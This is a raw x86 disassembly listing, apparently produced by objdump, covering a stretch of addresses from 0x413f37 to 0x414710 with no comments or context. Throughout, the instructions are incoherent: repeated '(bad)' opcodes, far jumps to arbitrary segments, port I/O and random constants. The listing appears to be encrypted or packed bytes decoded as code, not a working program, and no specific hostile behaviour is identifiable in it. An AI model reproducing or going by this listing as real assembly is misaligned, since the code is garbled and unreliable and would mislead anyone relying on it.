  413f37:	push   eax
  413f38:	sub    bh,BYTE PTR [eax]
  413f3a:	nop
  413f3b:	iret   
  413f3c:	sub    edi,DWORD PTR [edi-0x147ed6e6]
  413f42:	es jbe 0x413f59
  413f45:	mov    dh,0xfc
  413f47:	cmp    cl,dh
  413f49:	sbb    edx,DWORD PTR [esi-0x59]
  413f4c:	sbb    BYTE PTR [esi+0x52],cl
  413f4f:	je     0x413f4e
  413f51:	rol    ecx,cl
  413f53:	push   ss
  413f54:	mov    WORD PTR [eax-0x666a8a80],cs
  413f5a:	std    
  413f5b:	inc    ecx
  413f5c:	mov    DWORD PTR [ebp+0x54],ecx
  413f5f:	push   ds
  413f60:	arpl   sp,cx
  413f62:	dec    ebp
  413f63:	dec    ebp
  413f64:	pusha  
  413f65:	ror    eax,1
  413f67:	sbb    BYTE PTR [eax],ah
  413f69:	mov    esp,0xb69cbac0
  413f6e:	xor    bh,BYTE PTR [ebp+0x78]
  413f71:	xor    BYTE PTR [esi-0x5c],bh
  413f74:	or     eax,0x233199b4
  413f79:	outs   dx,BYTE PTR ds:[esi]
  413f7a:	push   esi
  413f7b:	jno    0x413f79
  413f7d:	xor    bl,BYTE PTR [eax+0x23]
  413f80:	mov    eax,ds:0x89fbf3f
  413f85:	mov    ch,0xac
  413f87:	test   BYTE PTR ds:0x36c92e7b,al
  413f8d:	pop    ecx
  413f8e:	test   DWORD PTR [ebx-0x5656723],ebx
  413f94:	cdq    
  413f95:	test   BYTE PTR ds:0xadd8b4c5,0x98
  413f9c:	cmp    al,0xc0
  413f9e:	(bad)  
  413f9f:	cwde   
  413fa0:	xchg   esp,eax
  413fa1:	imul   esi,esi,0xfffffff4
  413fa4:	sahf   
  413fa5:	jmp    0x3571:0x3b088086
  413fac:	jb     0x413fd5
  413fae:	mov    ebx,0x846bb295
  413fb3:	mov    cl,0x9e
  413fb5:	shl    DWORD PTR [edx+0x52],cl
  413fb8:	or     dl,BYTE PTR [eax+0x7c]
  413fbb:	jge    0x413f53
  413fbd:	sbb    al,0xf1
  413fbf:	aaa    
  413fc0:	push   ebx
  413fc1:	adc    al,0xdd
  413fc3:	outs   dx,DWORD PTR ds:[esi]
  413fc4:	imul   eax,DWORD PTR [edx-0x6796dad4],0xffffffd3
  413fcb:	mov    bh,0x87
  413fcd:	sub    DWORD PTR [ebp+0x2aab7d47],ecx
  413fd3:	stos   BYTE PTR es:[edi],al
  413fd4:	call   0x87cd4e9b
  413fd9:	aas    
  413fda:	rol    DWORD PTR [ebp-0x5f],1
  413fdd:	mov    al,0xe2
  413fdf:	int    0x5d
  413fe1:	fisub  DWORD PTR [eax+ebx*8-0x3a8f0af6]
  413fe8:	xchg   edi,eax
  413fe9:	jecxz  0x414054
  413feb:	stc    
  413fec:	mov    edi,0xc7fda02f
  413ff1:	cmp    BYTE PTR [eax],dh
  413ff3:	inc    esi
  413ff4:	xor    al,0x42
  413ff6:	bound  esi,QWORD PTR [edi+0x4]
  413ff9:	lods   eax,DWORD PTR ds:[esi]
  413ffa:	outs   dx,BYTE PTR ds:[esi]
  413ffb:	add    eax,0xac3a3b63
  414000:	jle    0x413f9f
  414002:	mov    esi,0xc14261cb
  414007:	ror    DWORD PTR [edx+0x648aa72d],cl
  41400d:	mov    al,ds:0xff68a9d4
  414012:	dec    edi
  414013:	retf   
  414014:	and    ebx,edi
  414016:	sbb    edi,DWORD PTR [esi]
  414018:	mov    ds:0x4774186c,eax
  41401d:	stc    
  41401e:	repnz mov bl,0x11
  414021:	add    edi,DWORD PTR [esi-0x3c26df06]
  414027:	mov    eax,ds:0x63705ee2
  41402c:	sub    eax,0xf7ff855e
  414031:	mov    bh,0xc4
  414033:	or     eax,ebp
  414035:	sbb    al,BYTE PTR [edx+edi*8]
  414038:	rol    dl,0xca
  41403b:	dec    edi
  41403c:	jl     0x41402e
  41403e:	push   edx
  41403f:	and    BYTE PTR [eax+0x4fb78394],dl
  414045:	(bad)  [edx+0xd5efdf8]
  41404b:	or     bh,bl
  41404d:	xchg   ecx,eax
  41404e:	stc    
  41404f:	jnp    0x414058
  414051:	loop   0x4140b5
  414053:	and    DWORD PTR [ebx+0x67c78114],ebp
  414059:	adc    DWORD PTR [ebx+0x473394c],ebp
  41405f:	inc    edi
  414060:	adc    esp,DWORD PTR [ebp-0x3dd63c30]
  414066:	sbb    bl,BYTE PTR [eax-0x75]
  414069:	push   0xe3929028
  41406e:	sbb    BYTE PTR [eax],0x19
  414071:	fstp   QWORD PTR [edx]
  414073:	and    esp,DWORD PTR [esp+ebx*2-0x15]
  414077:	adc    DWORD PTR [ecx+0x13],edx
  41407a:	loope  0x4140f3
  41407c:	jmp    0x414061
  41407e:	jmp    0x4140d3
  414080:	xchg   ebx,eax
  414081:	loopne 0x4140db
  414083:	sub    edi,eax
  414085:	xchg   ebx,eax
  414086:	or     bh,cl
  414088:	adc    al,0x3b
  41408a:	fdivr  DWORD PTR [ecx+0x31]
  41408d:	dec    esi
  41408e:	xlat   BYTE PTR ds:[ebx]
  41408f:	in     eax,0xbc
  414091:	repz test eax,0x77b7f3b2
  414097:	and    bl,BYTE PTR [ebx-0x5e]
  41409a:	pop    edi
  41409b:	cmp    DWORD PTR [esi],edi
  41409d:	in     eax,0x5c
  41409f:	(bad)  
  4140a0:	nop
  4140a1:	mov    ebp,0x1a7a5c21
  4140a6:	push   0xfffffffa
  4140a8:	fadd   DWORD PTR [ecx+edi*4+0x9d69942]
  4140af:	les    eax,FWORD PTR [eax-0x5bfab0b5]
  4140b5:	pop    eax
  4140b6:	and    DWORD PTR [ecx-0x73],ebp
  4140b9:	jmp    0x41404c
  4140bb:	pop    ebx
  4140bc:	call   0xa7ab:0xa2b676b0
  4140c3:	fadd   DWORD PTR [eax]
  4140c5:	pminsw mm0,QWORD PTR [edx-0x4713929e]
  4140cc:	push   ebx
  4140cd:	js     0x4140e9
  4140cf:	daa    
  4140d0:	or     BYTE PTR [eax-0x72],0xa
  4140d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140d5:	mov    bl,BYTE PTR [esi]
  4140d7:	push   ds
  4140d8:	pop    ebp
  4140d9:	mov    DWORD PTR [edi+0xa],ebx
  4140dc:	mov    dh,0xee
  4140de:	lds    esi,FWORD PTR [ebp+0x77b399b1]
  4140e4:	add    dl,BYTE PTR [edx+esi*1]
  4140e7:	(bad)  
  4140e8:	test   eax,0xa5632488
  4140ed:	outs   dx,DWORD PTR ds:[esi]
  4140ee:	test   ecx,esp
  4140f0:	or     al,0xa3
  4140f2:	push   es
  4140f3:	aaa    
  4140f4:	push   0xffffffcd
  4140f6:	jecxz  0x4140a5
  4140f8:	enter  0x1f44,0x57
  4140fc:	mov    ds:0xac788b3d,eax
  414101:	int    0x2e
  414103:	sbb    eax,0xed5e1af5
  414108:	div    BYTE PTR [edx-0x18]
  41410b:	dec    esi
  41410c:	push   esp
  41410d:	aaa    
  41410e:	imul   esp,DWORD PTR [ecx+edi*2],0xffffffa6
  414112:	sub    al,0xfd
  414114:	jb     0x41410f
  414116:	iret   
  414117:	mov    es,ebp
  414119:	leave  
  41411a:	pop    edi
  41411b:	retf   0x63c5
  41411e:	test   al,0xc4
  414120:	pop    esi
  414121:	loopne 0x414160
  414123:	mov    esp,0x64702765
  414128:	(bad)  
  414129:	adc    eax,0x6809aa81
  41412e:	mov    eax,ds:0x3e5eebf2
  414133:	call   0xdb82892f
  414138:	scas   al,BYTE PTR es:[edi]
  414139:	outs   dx,DWORD PTR ds:[esi]
  41413a:	ja     0x41418a
  41413c:	fwait
  41413d:	dec    ebx
  41413e:	push   edx
  41413f:	and    esi,esp
  414141:	or     ch,BYTE PTR [ecx+ecx*4+0x14]
  414145:	mov    ds:0x991cfd89,al
  41414a:	scas   eax,DWORD PTR es:[edi]
  41414b:	sub    ax,0xf048
  41414f:	aad    0xbf
  414151:	xor    esi,DWORD PTR [edi+ecx*2]
  414154:	add    eax,0x463225e7
  414159:	sbb    eax,0x1998ffda
  41415e:	mov    edx,DWORD PTR [ebx]
  414160:	out    0x8,al
  414162:	(bad)  
  414163:	jmp    0x543802a3
  414168:	mov    dl,0x5b
  41416a:	xor    edx,eax
  41416c:	mov    DWORD PTR [edi],ecx
  41416e:	daa    
  41416f:	mov    edx,0x2768f650
  414174:	push   esi
  414175:	popf   
  414176:	call   0x3847:0x6f0195eb
  41417d:	jmp    0x414190
  41417f:	ins    BYTE PTR es:[edi],dx
  414180:	outs   dx,DWORD PTR ds:[esi]
  414181:	loop   0x414169
  414183:	inc    esp
  414184:	repnz and al,0x98
  414187:	sbb    ecx,edx
  414189:	and    eax,0xca17fa10
  41418e:	ins    BYTE PTR es:[edi],dx
  41418f:	stos   DWORD PTR es:[edi],eax
  414190:	addr16 push edi
  414192:	cmp    DWORD PTR [edi],ebx
  414194:	fs test eax,0x584c869f
  41419a:	mov    WORD PTR [eax+0x5d],cs
  41419d:	cmp    eax,0x3dd4ded
  4141a2:	(bad)  
  4141a3:	jecxz  0x414167
  4141a5:	or     ebx,ebp
  4141a7:	arpl   WORD PTR [esp+esi*1-0x5954ea69],bx
  4141ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141af:	pop    ecx
  4141b0:	mov    ch,0x77
  4141b2:	xor    bh,BYTE PTR [ebx-0x279a40b8]
  4141b8:	mov    dl,BYTE PTR [ebx]
  4141ba:	xor    eax,0x4f53c5d0
  4141bf:	fist   DWORD PTR [ebx]
  4141c1:	dec    BYTE PTR [edx-0x26]
  4141c4:	mov    al,ds:0x19cdeffa
  4141c9:	fsubr  QWORD PTR [eax-0x6c]
  4141cc:	in     eax,0xc6
  4141ce:	mov    cl,bl
  4141d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141d1:	and    al,BYTE PTR [eax]
  4141d3:	fbstp  TBYTE PTR [esi]
  4141d5:	mov    DWORD PTR [ebp-0x7c07a746],ebx
  4141db:	dec    ebx
  4141dc:	lock fild QWORD PTR [edx-0x190348d3]
  4141e3:	fucompp 
  4141e5:	sti    
  4141e6:	jne    0x4141a5
  4141e8:	inc    edx
  4141e9:	add    esi,DWORD PTR [eax+ebx*4]
  4141ec:	add    DWORD PTR fs:0xbeebfe09,0xffffffbe
  4141f4:	cli    
  4141f5:	sub    DWORD PTR [edx-0x19360d8c],0x37
  4141fc:	and    dh,cl
  4141fe:	mov    ah,0xb3
  414200:	ret    0xf035
  414203:	rcr    DWORD PTR [ebp-0x6],cl
  414206:	fadd   st(6),st
  414208:	pop    ecx
  414209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41420a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41420b:	fdiv   st(1),st
  41420d:	pushf  
  41420e:	test   DWORD PTR [esp+ebp*8],ebx
  414211:	sahf   
  414212:	dec    ebx
  414213:	xchg   esp,eax
  414214:	jbe    0x4141c9
  414216:	pop    eax
  414217:	scas   al,BYTE PTR es:[edi]
  414218:	mov    ecx,0x73b1d1c3
  41421d:	test   al,0x43
  41421f:	mov    dh,0xb8
  414221:	mov    ebp,0xf0da7d16
  414226:	mov    eax,0xec2688db
  41422b:	mov    al,0xeb
  41422d:	xor    BYTE PTR [ebx+edi*4+0x6d],bh
  414231:	out    0x8a,eax
  414233:	pop    es
  414234:	pop    edi
  414235:	sbb    DWORD PTR [edx+0x2c],edx
  414238:	sub    BYTE PTR [esi-0x7c0f5cf7],dh
  41423e:	mov    dh,0xd3
  414240:	ss cmp esi,esi
  414243:	pop    ebx
  414244:	push   es
  414245:	mov    esi,0x587f5363
  41424a:	jl     0x414254
  41424c:	stos   BYTE PTR es:[edi],al
  41424d:	addr16 dec esp
  41424f:	dec    esi
  414250:	icebp  
  414251:	mov    ah,0x82
  414253:	sbb    eax,0x63c4233d
  414258:	and    al,0x6b
  41425a:	aad    0x79
  41425c:	mov    cl,0xc
  41425e:	scas   al,BYTE PTR es:[edi]
  41425f:	add    eax,esp
  414261:	sub    eax,0x8c6fa73a
  414266:	push   ebp
  414267:	call   0xca66c594
  41426c:	shl    BYTE PTR [ebx],1
  41426e:	xchg   esi,eax
  41426f:	or     ah,ch
  414271:	lea    edx,[ebx]
  414273:	cdq    
  414274:	call   0xbce2:0x6fe2bcfa
  41427b:	mov    al,ds:0x40555c18
  414280:	push   ecx
  414281:	mov    ebx,0x5ef0d3a3
  414286:	call   0x2d42:0x67c9fc82
  41428d:	sbb    BYTE PTR [esi+0x6f],cl
  414290:	jg     0x4142ee
  414292:	jecxz  0x41430b
  414294:	push   edi
  414295:	or     esi,edi
  414297:	je     0x4142c3
  414299:	ficom  WORD PTR [ecx-0x46]
  41429c:	leave  
  41429d:	das    
  41429e:	pop    esp
  41429f:	daa    
  4142a0:	push   ds
  4142a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142a2:	mov    ds:0x5b3da948,al
  4142a7:	add    DWORD PTR [edi-0x7f0683df],esi
  4142ad:	or     esp,DWORD PTR [ecx]
  4142af:	adc    DWORD PTR [ebx-0x35],ebx
  4142b2:	mov    ds:0x2b0d1df,al
  4142b7:	aas    
  4142b8:	dec    esp
  4142b9:	mov    ch,0x68
  4142bb:	jle    0x4142fc
  4142bd:	neg    DWORD PTR [edi]
  4142bf:	fiadd  WORD PTR ds:[edi-0x2d]
  4142c3:	inc    ebx
  4142c4:	rol    DWORD PTR [eax-0x67],cl
  4142c7:	inc    esi
  4142c8:	mov    ebp,0xdcffce16
  4142cd:	mov    ecx,0x98aa6cd8
  4142d2:	mov    ah,0xbb
  4142d4:	fdiv   st,st(5)
  4142d6:	enter  0x7287,0xe4
  4142da:	ret    
  4142db:	arpl   WORD PTR [edi+0x62d958a7],ax
  4142e1:	dec    ebp
  4142e2:	jle    0x4142bc
  4142e4:	push   ds
  4142e5:	or     ah,bh
  4142e7:	sbb    dl,BYTE PTR [ecx-0x31]
  4142ea:	inc    edx
  4142eb:	cdq    
  4142ec:	(bad)  
  4142ed:	fsubrp st(4),st
  4142ef:	jmp    0xf072:0x6c6d45ac
  4142f6:	(bad)  
  4142f7:	stc    
  4142f8:	or     DWORD PTR [ebp-0x7f54ecb8],esp
  4142fe:	inc    eax
  4142ff:	(bad)  
  414300:	push   edi
  414301:	xor    BYTE PTR [ebp+0x7f],dl
  414304:	mov    edi,0x7faeb120
  414309:	push   edi
  41430a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41430b:	xchg   eax,ebp
  41430d:	add    eax,0x3ef30333
  414312:	gs dec edi
  414314:	pop    ecx
  414315:	out    0x26,al
  414317:	xchg   ecx,eax
  414318:	sub    DWORD PTR [edi],ebp
  41431a:	sbb    DWORD PTR [edx],esi
  41431c:	mov    esp,0x9aeb4bb8
  414321:	std    
  414322:	jmp    0x4142ad
  414324:	dec    ebx
  414325:	loopne 0x414340
  414327:	imul   eax,DWORD PTR [ecx],0xc674c193
  41432d:	popf   
  41432e:	push   edx
  41432f:	mov    ebx,0xa5c7e7db
  414334:	xor    DWORD PTR [esi+0x5e47f16d],edi
  41433a:	out    0x37,al
  41433c:	fwait
  41433d:	fs push 0x254bb564
  414343:	shr    BYTE PTR ds:0x9e18,0x50
  414349:	xchg   DWORD PTR [eiz*4+0x64a2f820],ebp
  414350:	dec    esi
  414351:	xor    BYTE PTR [edx+esi*4+0x7c],ch
  414355:	push   edi
  414356:	xlat   BYTE PTR ds:[ebx]
  414357:	mov    al,0x4c
  414359:	pop    ebx
  41435a:	pop    es
  41435b:	jmp    0x3236:0x67330d5
  414362:	xor    ecx,DWORD PTR [eax]
  414364:	jns    0x414381
  414366:	adc    eax,0xf48aa644
  41436b:	adc    BYTE PTR [edx],0xa9
  41436e:	jl     0x4143b0
  414370:	xchg   BYTE PTR [esi-0x182d2deb],ah
  414376:	adc    BYTE PTR [edi+0x55],dh
  414379:	mov    edx,0xa59df162
  41437e:	scas   al,BYTE PTR es:[edi]
  41437f:	jae    0x414308
  414381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414382:	sbb    edi,eax
  414384:	(bad)  
  414385:	fs loop 0x4143a9
  414388:	sti    
  414389:	loop   0x4143cc
  41438b:	add    al,0xaf
  41438d:	das    
  41438e:	xchg   edx,eax
  41438f:	fnstsw WORD PTR [ebp-0x26]
  414392:	push   0x3e
  414394:	adc    eax,0x2e2a72f4
  414399:	add    DWORD PTR [ecx],esp
  41439b:	mov    esp,0x13b42767
  4143a0:	pop    edi
  4143a1:	pop    ds
  4143a2:	call   0xa4ed:0x5a479e20
  4143a9:	xor    DWORD PTR [eax*1-0x61db84b5],esp
  4143b0:	rcl    bh,1
  4143b2:	data16 fldcw WORD PTR [ebx]
  4143b5:	xchg   esi,eax
  4143b6:	bound  ecx,QWORD PTR [ebx-0x66be4cf2]
  4143bc:	retf   
  4143bd:	iret   
  4143be:	sub    al,0x3
  4143c0:	xchg   edi,eax
  4143c1:	idiv   BYTE PTR [ecx-0x1b5dbd5e]
  4143c7:	ficomp DWORD PTR [edi+0x742baef5]
  4143cd:	js     0x414437
  4143cf:	into   
  4143d0:	arpl   WORD PTR [esp+ebp*8+0x7c],sp
  4143d4:	mov    ebp,0x45ddc0d3
  4143d9:	mov    WORD PTR [ebp-0x2c24d818],ds
  4143df:	dec    edx
  4143e0:	in     al,0x62
  4143e2:	ins    BYTE PTR es:[edi],dx
  4143e3:	clc    
  4143e4:	jmp    0xdb7b:0xa9dfeb2c
  4143eb:	mov    edx,0x4dcdb183
  4143f0:	pop    edx
  4143f1:	scas   al,BYTE PTR es:[edi]
  4143f2:	out    0xe9,eax
  4143f4:	jbe    0x4143db
  4143f6:	test   eax,0xc7df7379
  4143fb:	out    0xe3,al
  4143fd:	leave  
  4143fe:	xchg   ebp,eax
  4143ff:	pop    esi
  414400:	lea    ebx,[eax]
  414402:	and    al,0x83
  414404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414405:	sbb    dh,ch
  414407:	cmc    
  414408:	es (bad) 
  41440b:	xchg   BYTE PTR [eax+0x18c62069],bl
  414411:	inc    BYTE PTR [ebx+eiz*8-0x66]
  414415:	imul   esi,DWORD PTR [ebx+0x8],0xf0cde583
  41441c:	out    0x37,al
  41441e:	pop    edi
  41441f:	add    al,0x84
  414421:	push   edi
  414422:	jo     0x414493
  414424:	sub    al,0x13
  414426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414427:	enter  0xcdae,0xdc
  41442b:	rcl    DWORD PTR [eax+ebx*4-0x188bdab9],0x69
  414433:	cdq    
  414434:	adc    dh,BYTE PTR [ecx+0x69]
  414437:	xor    DWORD PTR [esi+0x18f5f6c9],eax
  41443d:	dec    esp
  41443e:	mov    ah,0xde
  414440:	dec    esi
  414441:	repz (bad) 
  414443:	pop    ebx
  414444:	mov    bl,0xcb
  414446:	daa    
  414447:	mov    ds:0x1fa41358,al
  41444c:	jns    0x414475
  41444e:	jge    0x414440
  414450:	lea    edi,[ebp-0x5a]
  414453:	inc    esi
  414454:	xor    esp,DWORD PTR [eax-0x15]
  414457:	mov    ah,0x17
  414459:	ret    0x75a
  41445c:	nop
  41445d:	enter  0x6c3d,0x29
  414461:	mov    eax,ebx
  414463:	sub    DWORD PTR ds:0xa48d72fa,0x6c
  41446a:	add    BYTE PTR [eax],dl
  41446c:	mov    ch,0x94
  41446e:	stos   BYTE PTR es:[edi],al
  41446f:	xchg   ebp,ecx
  414471:	xor    ebx,esi
  414473:	bound  ebx,QWORD PTR [edi]
  414475:	stos   BYTE PTR es:[edi],al
  414476:	inc    esi
  414477:	leave  
  414478:	in     eax,0xe1
  41447a:	int    0x32
  41447c:	retf   
  41447d:	xchg   edx,eax
  41447e:	mov    ah,0xbd
  414480:	and    ebx,ebp
  414482:	ja     0x41448a
  414484:	popw   ds
  414486:	xchg   edi,eax
  414487:	jae    0x4144f6
  414489:	in     al,0x1f
  41448b:	fstp   TBYTE PTR [ebp+0x22]
  41448e:	scas   eax,DWORD PTR es:[edi]
  41448f:	inc    BYTE PTR [ebx+0x3a]
  414492:	dec    ebp
  414493:	js     0x414481
  414495:	arpl   WORD PTR [eax],si
  414497:	mov    dh,ah
  414499:	push   edx
  41449a:	in     eax,dx
  41449b:	mov    ah,0x32
  41449d:	xchg   esi,eax
  41449e:	mov    dh,0x8d
  4144a0:	add    eax,0xaedb5c23
  4144a5:	sti    
  4144a6:	mov    DWORD PTR [ebp-0x7ecaae13],ecx
  4144ac:	mov    al,ds:0xb0401548
  4144b1:	and    bh,dl
  4144b3:	and    BYTE PTR [ebx+esi*1-0x7df1aa30],bh
  4144ba:	(bad)  
  4144bb:	dec    eax
  4144bc:	or     DWORD PTR [esi+0x5e],eax
  4144bf:	rol    DWORD PTR [edx],cl
  4144c1:	push   edi
  4144c2:	aas    
  4144c3:	ins    DWORD PTR es:[edi],dx
  4144c4:	lods   eax,DWORD PTR ds:[esi]
  4144c5:	adc    ch,BYTE PTR [esi-0x15d9018]
  4144cb:	in     eax,0x35
  4144cd:	add    eax,0xbb57f708
  4144d2:	or     eax,0xec64a182
  4144d7:	lock out 0xae,al
  4144da:	mov    ch,0x50
  4144dc:	ficom  DWORD PTR cs:[esi]
  4144df:	or     DWORD PTR [ebx-0x42],0x972bd5df
  4144e6:	xacquire xchg WORD PTR [ebp-0x1d078ef6],dx
  4144ee:	jb     0x414554
  4144f0:	pop    ds
  4144f1:	nop
  4144f2:	and    BYTE PTR [edi+0x776c9757],bh
  4144f8:	push   esp
  4144f9:	(bad)  
  4144fa:	push   cs
  4144fb:	dec    ebp
  4144fc:	aam    0x4b
  4144fe:	test   DWORD PTR [ebx-0x8],eax
  414501:	gs inc ebp
  414503:	shl    BYTE PTR [edi],cl
  414505:	or     eax,0x9e36e0f8
  41450a:	or     esi,DWORD PTR [ebp-0xd]
  41450d:	sbb    BYTE PTR [esi+0x32],bh
  414510:	dec    esi
  414511:	cmp    BYTE PTR [ebp+0x63],bl
  414514:	mov    esi,DWORD PTR [ebx]
  414516:	push   edi
  414517:	jbe    0x414542
  414519:	leave  
  41451a:	xlat   BYTE PTR ds:[ebx]
  41451b:	int    0xa7
  41451d:	int    0xee
  41451f:	test   eax,0x864172d5
  414524:	inc    edx
  414525:	inc    ebp
  414526:	push   edi
  414527:	add    DWORD PTR [eax],eax
  414529:	push   es
  41452a:	inc    eax
  41452b:	sbb    ebp,DWORD PTR [ecx+0x62]
  41452e:	fiadd  WORD PTR [edi]
  414530:	loope  0x414580
  414532:	cmp    BYTE PTR ds:0x1dbf2af3,0x7d
  414539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41453a:	xor    ecx,DWORD PTR [edx]
  41453c:	mov    esp,DWORD PTR [ecx+0x76b573da]
  414542:	das    
  414543:	push   cs
  414544:	retf   
  414545:	cmc    
  414546:	adc    ah,ah
  414548:	dec    esp
  414549:	gs gs jmp 0x2e0c:0x9f4743ab
  414552:	sbb    edi,esi
  414554:	jmp    0x41450d
  414556:	lods   eax,DWORD PTR ds:[esi]
  414557:	and    ecx,ebx
  414559:	push   es
  41455a:	addr16 pop ecx
  41455c:	ins    BYTE PTR es:[edi],dx
  41455d:	aam    0xfd
  41455f:	xchg   BYTE PTR [eax],dh
  414561:	mov    ebp,0xf6e92c2a
  414566:	cmp    al,dl
  414568:	xchg   ecx,eax
  414569:	xor    al,0x9
  41456b:	mov    dl,0x50
  41456d:	stos   DWORD PTR es:[edi],eax
  41456e:	mov    eax,ds:0x94b4a4e9
  414573:	jae    0x4145e4
  414575:	sbb    edi,DWORD PTR [esi]
  414577:	xor    al,0x74
  414579:	push   esp
  41457a:	xchg   DWORD PTR [esp+eiz*4+0x52],esi
  41457e:	jmp    0x4145fb
  414580:	icebp  
  414581:	mov    ebp,0xf486336e
  414586:	dec    edi
  414587:	fstp   DWORD PTR [edx-0x67065230]
  41458d:	loope  0x414528
  41458f:	fs mov bl,0xed
  414592:	fisttp WORD PTR [edx-0x69]
  414595:	pop    ecx
  414596:	dec    esp
  414597:	mov    ebp,0x636ebd9c
  41459c:	xchg   esi,eax
  41459d:	push   edx
  41459e:	cdq    
  41459f:	or     eax,0xb3dd7c4c
  4145a4:	push   ebp
  4145a5:	or     ah,BYTE PTR [eax+0x56]
  4145a8:	pop    es
  4145a9:	cmp    bh,BYTE PTR [edx]
  4145ab:	pop    ecx
  4145ac:	ret    0x8c10
  4145af:	jnp    0x414561
  4145b1:	adc    cl,BYTE PTR [esi]
  4145b3:	mov    edx,0x63a2be19
  4145b8:	mov    ecx,DWORD PTR [eax-0x13]
  4145bb:	mov    esp,ebx
  4145bd:	xchg   esi,eax
  4145be:	stc    
  4145bf:	adc    eax,edx
  4145c1:	push   ds
  4145c2:	mov    DWORD PTR [ecx-0x1e0356df],eax
  4145c8:	xchg   edx,eax
  4145c9:	ss jle 0x414559
  4145cc:	mov    bh,0x3d
  4145ce:	popf   
  4145cf:	mov    ecx,ds
  4145d1:	mov    edi,0x365c5915
  4145d6:	mov    dh,0x61
  4145d8:	call   0x233679df
  4145dd:	mov    ds:0x1f71a942,al
  4145e2:	lea    eax,[eax-0x7f]
  4145e5:	xor    eax,0x85eb3c2a
  4145ea:	es loope 0x4145e5
  4145ed:	lahf   
  4145ee:	lods   eax,DWORD PTR ds:[esi]
  4145ef:	pop    eax
  4145f0:	into   
  4145f1:	loop   0x41463b
  4145f3:	xor    BYTE PTR [esi-0x3bb9c657],0xec
  4145fa:	or     al,0xa2
  4145fc:	inc    edx
  4145fd:	out    dx,eax
  4145fe:	dec    edi
  4145ff:	dec    ecx
  414600:	inc    edi
  414601:	xor    DWORD PTR [edx+0x444c028d],0x50417c41
  41460b:	push   esi
  41460c:	adc    eax,0x2d7b94eb
  414611:	xor    dl,dl
  414613:	dec    ecx
  414614:	(bad)
  414618:	ja     0x4145d9
  41461a:	stos   DWORD PTR es:[edi],eax
  41461b:	ret    0xc504
  41461e:	cwde   
  41461f:	mov    WORD PTR [edx+0xd],es
  414622:	cmp    ebx,DWORD PTR fs:[ebp+0x3d]
  414626:	dec    esi
  414627:	imul   edi,DWORD PTR [ebp+0x33],0x1c83a5f3
  41462e:	lds    esp,FWORD PTR [eax]
  414630:	clc    
  414631:	iret   
  414632:	mov    WORD PTR [esi],?
  414634:	mov    al,0x46
  414636:	pushf  
  414637:	cmp    eax,0x83adc4e8
  41463c:	xchg   esp,eax
  41463d:	xchg   ecx,eax
  41463e:	sub    ch,BYTE PTR [ecx-0x2fae3523]
  414644:	xor    eax,0xfcb6fb26
  414649:	xchg   BYTE PTR [eax+esi*8],al
  41464c:	or     BYTE PTR [edi+0x7a66bd01],0x6b
  414653:	adc    BYTE PTR [ecx],dh
  414655:	loope  0x4146b5
  414657:	enter  0x993e,0x1f
  41465b:	xchg   ebp,eax
  41465c:	cmp    ecx,DWORD PTR [eax-0x72]
  41465f:	jbe    0x4145f5
  414661:	fimul  WORD PTR [ebx-0xdb5195e]
  414667:	and    ebp,DWORD PTR [ebx-0x189e1640]
  41466d:	nop
  41466e:	xchg   esp,ecx
  414670:	ds push edi
  414672:	inc    esp
  414673:	sbb    eax,DWORD PTR [esi]
  414675:	(bad)  
  414676:	sub    edi,DWORD PTR [edi-0x42]
  414679:	out    dx,al
  41467a:	pop    ebp
  41467b:	and    ebp,edx
  41467d:	outs   dx,BYTE PTR ds:[esi]
  41467e:	loope  0x4146d0
  414680:	daa    
  414681:	pop    esi
  414682:	imul   esp,DWORD PTR [eax],0xdd022d0d
  414688:	pop    edi
  414689:	inc    ebp
  41468a:	pop    esi
  41468b:	mov    DWORD PTR [edi+0x23df8501],edi
  414691:	add    BYTE PTR [ebp-0x23],cl
  414694:	sti    
  414695:	jb     0x41465f
  414697:	fcomp  DWORD PTR [ecx]
  414699:	xchg   esi,eax
  41469a:	pop    esi
  41469b:	add    ebp,DWORD PTR [ebx+0x4e]
  41469e:	xchg   edi,eax
  41469f:	adc    ecx,edx
  4146a1:	cdq    
  4146a2:	jo     0x41466a
  4146a4:	aad    0x82
  4146a6:	sub    ecx,esp
  4146a8:	push   esp
  4146a9:	sahf   
  4146aa:	mov    ds:0xb82fd951,eax
  4146af:	test   BYTE PTR [esi],0x5
  4146b2:	mov    ah,0xe1
  4146b4:	in     al,dx
  4146b5:	mov    eax,ds:0x4505fa9b
  4146ba:	jp     0x414676
  4146bc:	mov    BYTE PTR [eax-0x55345480],dl
  4146c2:	sti    
  4146c3:	scas   eax,DWORD PTR es:[edi]
  4146c4:	add    ebp,DWORD PTR [ebp-0x61]
  4146c7:	cmp    eax,0xe4c7ed51
  4146cc:	mov    al,ds:0xaf5cd3f2
  4146d1:	(bad)
  4146d4:	and    al,BYTE PTR [ecx]
  4146d6:	scas   al,BYTE PTR es:[edi]
  4146d7:	cdq    
  4146d8:	loope  0x414757
  4146da:	xchg   ebx,eax
  4146db:	xchg   edi,eax
  4146dc:	dec    ebx
  4146dd:	out    dx,eax
  4146de:	fsubr  QWORD PTR [edx+0x1e]
  4146e1:	std    
  4146e2:	repnz mov ds:0x8f252646,eax
  4146e8:	je     0x414692
  4146ea:	or     eax,0x54d8cbb
  4146ef:	imul   edi,DWORD PTR [edi-0x4d],0xedef8147
  4146f6:	push   es
  4146f7:	out    0x3d,eax
  4146f9:	jae    0x414689
  4146fb:	pop    ss
  4146fc:	mov    edx,DWORD PTR [eax]
  4146fe:	dec    ebp
  4146ff:	adc    dh,BYTE PTR [esi-0x57]
  414702:	pop    esp
  414703:	loope  0x4146e7
  414705:	inc    edx
  414706:	push   0x3f
  414708:	ins    BYTE PTR es:[edi],dx
  414709:	dec    ebx
  41470a:	pop    edi
  41470b:	movaps XMMWORD PTR [edx],xmm7
  41470e:	js     0x414712
  414710:	shl    BYTE PTR [eax-0x34efb2dc],0x68
